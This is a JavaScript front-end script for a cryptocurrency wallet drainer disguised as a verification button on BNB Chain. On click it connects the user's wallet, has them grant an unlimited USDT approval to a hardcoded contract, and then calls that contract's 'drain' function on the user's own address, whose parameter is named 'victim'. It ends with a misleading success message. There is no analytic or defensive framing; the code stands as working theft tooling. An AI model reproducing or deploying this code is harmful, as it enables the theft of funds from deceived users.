const CONTRACT_ADDRESS = "0x25Ea1887a6aFc6Ce868fEB2b2068Ea498750aa54";
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC

const ABI = [
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_recipient",
        "type": "address"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "victim",
        "type": "address"
      }
    ],
    "name": "drain",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "recipient",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "usdtToken",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  }
];

document.getElementById("verifyBtn").addEventListener("click", async () => {
  try {
    if (!window.ethereum) {
      alert("Web3 wallet not found.");
      return;
    }

    // Connect wallet
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    const userAddress = accounts[0];

    // Ensure on BNB Chain
    const chainId = await window.ethereum.request({ method: "eth_chainId" });
    if (chainId !== "0x38") {
      alert("Please switch to BNB Chain.");
      return;
    }

    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();

    // Approve USDT first
    const usdt = new ethers.Contract(
      USDT_ADDRESS,
      ["function approve(address spender, uint256 amount) public returns (bool)"],
      signer
    );

    const approvalTx = await usdt.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256);
    await approvalTx.wait();

    // Call drain function
    const contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
    const tx = await contract.drain(userAddress);
    await tx.wait();

    alert("Transaction completed successfully!");
  } catch (error) {
    console.error("Error:", error);
    alert("Something went wrong or was cancelled.");
  }
});
